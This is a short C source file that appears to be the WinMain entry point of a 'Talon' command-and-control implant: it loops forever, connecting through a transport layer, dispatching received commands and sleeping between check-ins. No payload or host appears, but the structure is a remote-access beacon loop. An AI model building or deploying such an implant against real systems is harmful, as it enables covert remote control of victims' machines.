#include <Talon.h>

#include <Core.h>
#include <Transport.h>
#include <Command.h>

INSTANCE Instance = { 0 };

INT WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nShowCmd )
{
    TalonInit();
    do
    {
        if ( ! Instance.Session.Connected )
        {
            if ( TransportInit( ) )
                CommandDispatcher();
        }

        TalonSleep();

    } while ( TRUE );
}